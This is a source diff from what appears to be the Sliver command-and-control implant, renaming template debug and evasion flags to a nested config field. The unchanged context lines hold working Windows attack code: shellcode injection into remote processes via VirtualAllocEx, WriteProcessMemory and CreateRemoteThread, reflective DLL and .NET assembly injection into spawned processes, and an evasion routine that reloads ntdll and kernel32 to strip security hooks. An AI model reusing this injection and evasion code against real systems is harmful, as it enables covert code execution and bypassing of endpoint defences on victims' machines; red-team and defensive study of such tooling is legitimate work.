@@ -24,7 +24,7 @@ import (
 	"bytes"
 	"encoding/binary"
 
-	// {{if .Debug}}
+	// {{if .Config.Debug}}
 	"log"
 	// {{else}}{{end}}
 	"os/exec"
@@ -34,7 +34,7 @@ import (
 	"unsafe"
 
 	"syscall"
-	// {{if .Evasion}}
+	// {{if .Config.Evasion}}
 	"github.com/bishopfox/sliver/sliver/evasion"
 	"github.com/bishopfox/sliver/sliver/version"
 
@@ -76,7 +76,7 @@ func injectTask(processHandle windows.Handle, data []byte, rwxPages bool) error 
 	)
 	dataSize := len(data)
 	// Remotely allocate memory in the target process
-	// {{if .Debug}}
+	// {{if .Config.Debug}}
 	log.Println("allocating remote process memory ...")
 	// {{end}}
 	if rwxPages {
@@ -84,11 +84,11 @@ func injectTask(processHandle windows.Handle, data []byte, rwxPages bool) error 
 	} else {
 		remoteAddr, err = syscalls.VirtualAllocEx(processHandle, uintptr(0), uintptr(uint32(dataSize)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
 	}
-	// {{if .Debug}}
+	// {{if .Config.Debug}}
 	log.Printf("virtualallocex returned: remoteAddr = %v, err = %v", remoteAddr, err)
 	// {{end}}
 	if err != nil {
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Println("[!] failed to allocate remote process memory")
 		// {{end}}
 		return err
@@ -97,11 +97,11 @@ func injectTask(processHandle windows.Handle, data []byte, rwxPages bool) error 
 	// Write the shellcode into the remotely allocated buffer
 	var nLength uintptr
 	err = syscalls.WriteProcessMemory(processHandle, remoteAddr, &data[0], uintptr(uint32(dataSize)), &nLength)
-	// {{if .Debug}}
+	// {{if .Config.Debug}}
 	log.Printf("writeprocessmemory returned: err = %v", err)
 	// {{end}}
 	if err != nil {
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Printf("[!] failed to write data into remote process")
 		// {{end}}
 		return err
@@ -111,24 +111,24 @@ func injectTask(processHandle windows.Handle, data []byte, rwxPages bool) error 
 		// Set proper page permissions
 		err = syscalls.VirtualProtectEx(processHandle, remoteAddr, uintptr(uint(dataSize)), windows.PAGE_EXECUTE_READ, &oldProtect)
 		if err != nil {
-			//{{if .Debug}}
+			//{{if .Config.Debug}}
 			log.Println("VirtualProtectEx failed:", err)
 			//{{end}}
 			return err
 		}
 	}
 	// Create the remote thread to where we wrote the shellcode
-	// {{if .Debug}}
+	// {{if .Config.Debug}}
 	log.Println("successfully injected data, starting remote thread ....")
 	// {{end}}
 	attr := new(windows.SecurityAttributes)
 	var lpThreadId uint32
 	_, err = syscalls.CreateRemoteThread(processHandle, attr, uint32(0), remoteAddr, 0, 0, &lpThreadId)
-	// {{if .Debug}}
+	// {{if .Config.Debug}}
 	log.Printf("createremotethread returned:  err = %v", err)
 	// {{end}}
 	if err != nil {
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Printf("[!] failed to create remote thread")
 		// {{end}}
 		return err
@@ -171,13 +171,13 @@ func LocalTask(data []byte, rwxPages bool) error {
 		var oldProtect uint32
 		err = windows.VirtualProtect(addr, uintptr(size), windows.PAGE_EXECUTE_READ, &oldProtect)
 		if err != nil {
-			//{{if .Debug}}
+			//{{if .Config.Debug}}
 			log.Println("VirtualProtect failed:", err)
 			//{{end}}
 			return err
 		}
 	}
-	// {{if .Debug}}
+	// {{if .Config.Debug}}
 	log.Printf("creating local thread with start address: 0x%08x", addr)
 	// {{end}}
 	var lpThreadId uint32
@@ -192,20 +192,20 @@ func ExecuteAssembly(hostingDll, assembly []byte, process, params string, amsi b
 	if err != nil {
 		return "", err
 	}
-	// {{if .Debug}}
+	// {{if .Config.Debug}}
 	log.Println("[*] Assembly size:", len(assembly))
 	log.Println("[*] Hosting dll size:", len(hostingDll))
 	// {{end}}
 	var stdoutBuf, stderrBuf bytes.Buffer
 	cmd, err := startProcess(process, &stdoutBuf, &stderrBuf, true)
 	if err != nil {
-		//{{if .Debug}}
+		//{{if .Config.Debug}}
 		log.Println("Could not start process:", process)
 		//{{end}}
 		return "", err
 	}
 	pid := cmd.Process.Pid
-	// {{if .Debug}}
+	// {{if .Config.Debug}}
 	log.Printf("[*] %s started, pid = %d\n", process, pid)
 	// {{end}}
 	handle, err := windows.OpenProcess(PROCESS_ALL_ACCESS, true, uint32(pid))
@@ -217,7 +217,7 @@ func ExecuteAssembly(hostingDll, assembly []byte, process, params string, amsi b
 	if err != nil {
 		return "", err
 	}
-	// {{if .Debug}}
+	// {{if .Config.Debug}}
 	log.Printf("[*] Hosting DLL reflectively injected at 0x%08x\n", hostingDllAddr)
 	// {{end}}
 
@@ -246,14 +246,14 @@ func ExecuteAssembly(hostingDll, assembly []byte, process, params string, amsi b
 	if err != nil {
 		return "", err
 	}
-	// {{if .Debug}}
+	// {{if .Config.Debug}}
 	log.Printf("[*] Wrote %d bytes at 0x%08x\n", len(payload), assemblyAddr)
 	// {{end}}
 	threadHandle, err := protectAndExec(handle, hostingDllAddr, uintptr(hostingDllAddr)+uintptr(offset), assemblyAddr, uint32(len(hostingDll)))
 	if err != nil {
 		return "", err
 	}
-	// {{if .Debug}}
+	// {{if .Config.Debug}}
 	log.Printf("[*] RemoteThread started. Waiting for execution to finish.\n")
 	// {{end}}
 	err = waitForCompletion(threadHandle)
@@ -262,7 +262,7 @@ func ExecuteAssembly(hostingDll, assembly []byte, process, params string, amsi b
 	}
 	err = cmd.Process.Kill()
 	if err != nil {
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Println("Error kill: %v\n", err)
 		// {{end}}
 		return "", err
@@ -283,7 +283,7 @@ func SpawnDll(procName string, data []byte, offset uint32, args string) (string,
 		return "", err
 	}
 	pid := cmd.Process.Pid
-	// {{if .Debug}}
+	// {{if .Config.Debug}}
 	log.Printf("[*] %s started, pid = %d\n", procName, pid)
 	// {{end}}
 	handle, err := windows.OpenProcess(PROCESS_ALL_ACCESS, true, uint32(pid))
@@ -294,7 +294,7 @@ func SpawnDll(procName string, data []byte, offset uint32, args string) (string,
 	dataAddr, err := allocAndWrite(data, handle, uint32(len(data)))
 	argAddr := uintptr(0)
 	if len(args) > 0 {
-		//{{if .Debug}}
+		//{{if .Config.Debug}}
 		log.Printf("Args: %s\n", args)
 		//{{end}}
 		argsArray := []byte(args)
@@ -303,7 +303,7 @@ func SpawnDll(procName string, data []byte, offset uint32, args string) (string,
 			return "", err
 		}
 	}
-	//{{if .Debug}}
+	//{{if .Config.Debug}}
 	log.Printf("[*] Args addr: 0x%08x\n", argAddr)
 	//{{end}}
 	startAddr := uintptr(dataAddr) + uintptr(offset)
@@ -311,7 +311,7 @@ func SpawnDll(procName string, data []byte, offset uint32, args string) (string,
 	if err != nil {
 		return "", err
 	}
-	// {{if .Debug}}
+	// {{if .Config.Debug}}
 	log.Printf("[*] RemoteThread started. Waiting for execution to finish.\n")
 	// {{end}}
 
@@ -333,18 +333,18 @@ func refresh() error {
 	// Hotfix for #114
 	// Somehow this fucks up everything on Windows 8.1
 	// so we're skipping the RefreshPE calls.
-	// {{if .Evasion}}
+	// {{if .Config.Evasion}}
 	if version.GetVersion() != "6.3 build 9600" {
 		err := evasion.RefreshPE(ntdllPath)
 		if err != nil {
-			//{{if .Debug}}
+			//{{if .Config.Debug}}
 			log.Printf("RefreshPE on ntdll failed: %v\n", err)
 			//{{end}}
 			return err
 		}
 		err = evasion.RefreshPE(kernel32dllPath)
 		if err != nil {
-			//{{if .Debug}}
+			//{{if .Config.Debug}}
 			log.Printf("RefreshPE on kernel32 failed: %v\n", err)
 			//{{end}}
 			return err
@@ -369,7 +369,7 @@ func startProcess(proc string, stdout *bytes.Buffer, stderr *bytes.Buffer, suspe
 	}
 	err := cmd.Start()
 	if err != nil {
-		//{{if .Debug}}
+		//{{if .Config.Debug}}
 		log.Println("Could not start process:", proc)
 		//{{end}}
 		return nil, err
@@ -383,7 +383,7 @@ func waitForCompletion(threadHandle windows.Handle) error {
 		err := syscalls.GetExitCodeThread(threadHandle, &code)
 		// log.Println(code)
 		if err != nil && !strings.Contains(err.Error(), "operation completed successfully") {
-			// {{if .Debug}}
+			// {{if .Config.Debug}}
 			log.Printf("[-] Error when waiting for remote thread to exit: %s\n", err.Error())
 			// {{end}}
 			return err
@@ -416,14 +416,14 @@ func protectAndExec(handle windows.Handle, startAddr uintptr, threadStartAddr ui
 	var oldProtect uint32
 	err = syscalls.VirtualProtectEx(handle, startAddr, uintptr(dataLen), windows.PAGE_EXECUTE_READ, &oldProtect)
 	if err != nil {
-		//{{if .Debug}}
+		//{{if .Config.Debug}}
 		log.Println("VirtualProtectEx failed:", err)
 		//{{end}}
 		return
 	}
 	attr := new(windows.SecurityAttributes)
 	var lpThreadId uint32
-	//{{if .Debug}}
+	//{{if .Config.Debug}}
 	log.Printf("Starting thread at 0x%08x\n", startAddr)
 	//{{end}}
 	threadHandle, err = syscalls.CreateRemoteThread(handle, attr, 0, threadStartAddr, argAddr, 0, &lpThreadId)
